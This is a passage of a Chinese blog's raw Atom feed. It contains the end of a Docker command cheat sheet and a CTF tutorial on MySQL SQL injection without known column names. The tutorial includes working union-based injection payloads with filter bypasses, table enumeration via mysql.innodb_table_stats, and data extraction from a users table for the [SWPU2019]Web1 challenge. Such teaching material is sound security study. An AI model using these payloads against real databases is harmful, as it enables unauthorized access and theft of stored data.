class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像]      #搜索镜像</span><br><span class="line">docker pull [镜像]        #下载镜像</span><br><span class="line">docker run -p 4000:80 username&#x2F;repository:tag #从远程镜像仓库中拉取并运行镜像</span><br><span class="line"></span><br><span class="line">sudo docker pull ubuntu:12.04 等同于</span><br><span class="line">docker pull registry.hub.docker.com&#x2F;ubuntu:12.04 </span><br><span class="line"></span><br><span class="line">docker push [镜像]            #发布镜像</span><br><span class="line">docker rmi [镜像]             #删除镜像</span><br><span class="line">docker images                 #查看本地镜像(列目录)</span><br><span class="line">docker images    -q           #只显示镜像ID</span><br><span class="line">docker history [镜像]         #历史镜像</span><br><span class="line">docker tag [镜像] username&#x2F;repository:tag #标记镜像</span><br><span class="line"></span><br><span class="line">docker rmi $(docker images -q)      #删除所有停止的镜像</span><br><span class="line">docker rmi -f $(docker images -q)   #强制删除所有的镜像</span><br></pre></td></tr></table></figure><h4 id="容器相关操作"><a href="#容器相关操作" class="headerlink" title="容器相关操作"></a>容器相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#创建容器</span><br><span class="line">docker run [镜像] &#x2F;bin&#x2F;echo hello world       #输出hello world</span><br><span class="line">docker run -i -t [镜像] &#x2F;bin&#x2F;bash             #交互式进入容器 #-i: 以交互模式运行容器  -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">docker run [镜像]  apt-get install -y app_name    #在容器安装新的程序</span><br><span class="line"></span><br><span class="line">docker exec -it kali &#x2F;bin&#x2F;bash          #进入容器</span><br><span class="line">docker run -it -d kali                  #启动容器，后台运行 #-d: 后台运行容器，并返回容器ID；</span><br><span class="line">docker run -it -p 53:53 kali            #启动容器的时候可以映射端口 #-p: 端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">#进入交互式界面</span><br><span class="line">进入容器：</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker exec -it [容器ID] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#查看容器</span><br><span class="line">docker ps                   #列出当前运行的容器</span><br><span class="line">docker ps -a                #列出所有的容器</span><br><span class="line">docker ps -l                #列出最近一次启动的容器</span><br><span class="line">docker ps -a -q             #查看所有的容器ID</span><br><span class="line"></span><br><span class="line">#容器操作</span><br><span class="line">docker inspect [容器名字]&#x2F;ID        #显示容器信息</span><br><span class="line">docker start [容器名字]&#x2F;ID      #启动容器</span><br><span class="line">docker stop [容器名字]&#x2F;ID       #停止容器</span><br><span class="line">docker kill [容器名字]&#x2F;ID       #杀死容器</span><br><span class="line">docker restart [容器名字]&#x2F;ID        #重新启动容器</span><br><span class="line">docker attach [容器名字]&#x2F;ID     #进入容器</span><br><span class="line">docker logs [容器名字]&#x2F;ID       #查看容器日志</span><br><span class="line">docker diff [容器名字]&#x2F;ID       #查看容器修改操作</span><br><span class="line">docker top [容器名字]&#x2F;ID            #显示容器进程信息</span><br><span class="line">docker cp ID:&#x2F;path to_path      #从容器中拷贝数据到本地</span><br><span class="line">docker cp [容器名字]:&#x2F;path to_path  #从容器中拷贝数据到本地</span><br><span class="line"></span><br><span class="line">#删除容器</span><br><span class="line">docker rm [容器]&#x2F;ID       #删除容器</span><br><span class="line">docker rm $(docker ps -a -q)    #删除所有停止的容器</span><br><span class="line">docker rm -f $(docker ps -a -q) #强制删除所有的容器</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;docker简介&quot;&gt;&lt;a href=&quot;#docker简介&quot; class=&quot;headerlink&quot; title=&quot;docker简介&quot;&gt;&lt;/a&gt;docker简介&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立
      
    
    </summary>
    
    
      <category term="基础知识" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>MySQL无列名注入</title>
    <link href="http://yoursite.com/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-22T03:46:33.000Z</published>
    <updated>2020-03-22T15:30:47.122Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-简介"><a href="#0x-01-简介" class="headerlink" title="0x 01 简介"></a>0x 01 简介</h3><p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql =&gt; 5 的版本中存在一个名为  information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli  中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><p>当我们通过暴力破解获取到表名后，如何利用呢？</p><p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p><h3 id="0x-02-使用条件-amp-方法"><a href="#0x-02-使用条件-amp-方法" class="headerlink" title="0x 02 使用条件&amp;方法"></a>0x 02 使用条件&amp;方法</h3><p> <strong>使用条件&amp;方法</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p> <strong>不使用表名查询</strong></p><p>正常的 sql 查询如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120103425.png" alt></p><p>其中，列名为 id、name、password，使用 union 查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120025502.png" alt></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;3&#96; from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure><p>末尾的 a 可以是任意字符，用于命名。</p><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>同时查询多个列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x2d,&#96;3&#96;) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322230016384.png" alt></p><p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p><p>payload：<code>select a,b from posts where a=-1 union select 1,(select concat(</code>3<code>,0x2d,</code>4<code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></p><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><ol><li>注入点在广告名。点击广告详情，发现数据库的报错信息，证明存在注入。</li></ol><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>首先测试字段数量,有22个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">#group by获取列数</span><br><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;11</span><br></pre></td></tr></table></figure><p>查看数据库版本信息,是MariaDB</p><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322231728123.png" alt></p><p>由于过滤了or,所以用mysql.innodb_table_stats查询数据表或者用sys.schema_auto_increment_columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232338100.png" alt></p><p>查询users表，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232819155.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-简介&quot;&gt;&lt;a href=&quot;#0x-01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x 01 简介&quot;&gt;&lt;/a&gt;0x 01 简介&lt;/h3&gt;&lt;p&gt;顾名思义，就是在不知道列名的情况下进行 sql 注入。&lt;/p&gt;
&lt;p&gt;在 mysql =&amp;g
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="MySQL无列名注入" scheme="http://yoursite.com/tags/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
